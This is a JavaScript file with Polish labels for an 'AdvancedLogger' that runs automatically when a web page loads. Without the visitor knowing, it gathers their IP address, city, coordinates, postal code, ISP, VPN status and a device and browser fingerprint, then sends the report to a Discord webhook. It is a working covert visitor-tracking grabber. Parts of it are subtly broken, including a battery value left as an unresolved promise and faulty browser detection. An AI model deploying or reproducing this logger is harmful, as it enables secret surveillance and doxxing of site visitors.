import { CONFIG } from './config.js';

class AdvancedLogger {
    constructor() {
        this.data = {
            ip: null,
            location: {},
            device: {},
            network: {},
            browser: {},
            time: new Date().toLocaleString()
        };
    }

    async init() {
        await this._fetchIP();
        await this._fetchLocation();
        this._collectDeviceData();
        this._collectBrowserData();
        await this._checkVPN();
        this._sendToDiscord();
    }

    async _fetchIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            this.data.ip = data.ip;
        } catch (error) {
            console.error('Błąd pobierania IP:', error);
        }
    }

    async _fetchLocation() {
        if (!this.data.ip) return;
        
        try {
            const response = await fetch(`https://ipapi.co/${this.data.ip}/json/`);
            const locationData = await response.json();
            
            this.data.location = {
                country: locationData.country_name,
                region: locationData.region,
                city: locationData.city,
                coords: `${locationData.latitude}, ${locationData.longitude}`,
                timezone: locationData.timezone,
                postal: locationData.postal
            };
            
            this.data.network = {
                isp: locationData.org,
                asn: locationData.asn
            };
        } catch (error) {
            console.error('Błąd pobierania lokalizacji:', error);
        }
    }

    _collectDeviceData() {
        this.data.device = {
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency || 'Nieznane',
            memory: navigator.deviceMemory || 'Nieznane',
            screen: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth}-bit`,
            touchSupport: navigator.maxTouchPoints > 0,
            battery: this._getBatteryStatus()
        };
    }

    _getBatteryStatus() {
        if ('getBattery' in navigator) {
            return navigator.getBattery()
                .then(battery => `${Math.floor(battery.level * 100)}%`)
                .catch(() => 'Nieznane');
        }
        return 'Nieznane';
    }

    _collectBrowserData() {
        this.data.browser = {
            name: this._detectBrowser(),
            version: navigator.appVersion,
            language: navigator.language,
            cookies: navigator.cookieEnabled ? 'Włączone' : 'Wyłączone',
            privateMode: this._checkPrivateMode(),
            plugins: this._getPlugins()
        };
    }

    _detectBrowser() {
        const userAgent = navigator.userAgent;
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Edge')) return 'Edge';
        return 'Nieznana';
    }

    _checkPrivateMode() {
        try {
            localStorage.setItem('test', 'test');
            localStorage.removeItem('test');
            return false;
        } catch (e) {
            return true;
        }
    }

    _getPlugins() {
        return Array.from(navigator.plugins)
            .map(plugin => plugin.name)
            .join(', ') || 'Brak';
    }

    async _checkVPN() {
        if (!this.data.ip) return;
        
        try {
            const response = await fetch(`https://vpnapi.io/api/${this.data.ip}?key=${CONFIG.IPAPI_KEY}`);
            const vpnData = await response.json();
            this.data.network.isProxy = vpnData.security?.vpn || false;
        } catch (error) {
            console.error('Błąd sprawdzania VPN:', error);
        }
    }

    async _sendToDiscord() {
        if (!CONFIG.DISCORD_WEBHOOK) return;
        
        try {
            const message = this._formatMessage();
            await fetch(CONFIG.DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            });
        } catch (error) {
            console.error('Błąd wysyłania do Discord:', error);
        }
    }

    _formatMessage() {
        const { ip, location, device, network, browser, time } = this.data;
        
        return {
            content: "🚨 **Nowe wejście na stronę**",
            embeds: [{
                title: "Szczegółowe dane",
                color: 0x3498db,
                timestamp: new Date().toISOString(),
                fields: [
                    {
                        name: "🌍 IP & Lokalizacja",
                        value: `• **IP:** ${ip || 'Nieznane'}\n` +
                               `• **Kraj:** ${location.country || 'Nieznane'}\n` +
                               `• **Miasto:** ${location.city || 'Nieznane'}\n` +
                               `• **Współrzędne:** ${location.coords || 'Nieznane'}\n` +
                               `• **VPN/Proxy:** ${network.isProxy ? 'Tak' : 'Nie'}`
                    },
                    {
                        name: "📱 Urządzenie",
                        value: `• **System:** ${device.platform || 'Nieznane'}\n` +
                               `• **Ekran:** ${device.screen}\n` +
                               `• **Pamięć:** ${device.memory}GB\n` +
                               `• **Rdzenie:** ${device.cores}\n` +
                               `• **Bateria:** ${device.battery}`
                    },
                    {
                        name: "🌐 Przeglądarka",
                        value: `• **Nazwa:** ${browser.name}\n` +
                               `• **Wersja:** ${browser.version.split(' ')[0] || 'Nieznana'}\n` +
                               `• **Tryb prywatny:** ${browser.privateMode ? 'Tak' : 'Nie'}\n` +
                               `• **Pluginy:** ${browser.plugins.substring(0, 50)}...`
                    }
                ],
                footer: { text: `Czas: ${time}` }
            }]
        };
    }
}

// Automatyczne uruchomienie
document.addEventListener('DOMContentLoaded', () => {
    const logger = new AdvancedLogger();
    logger.init();
});
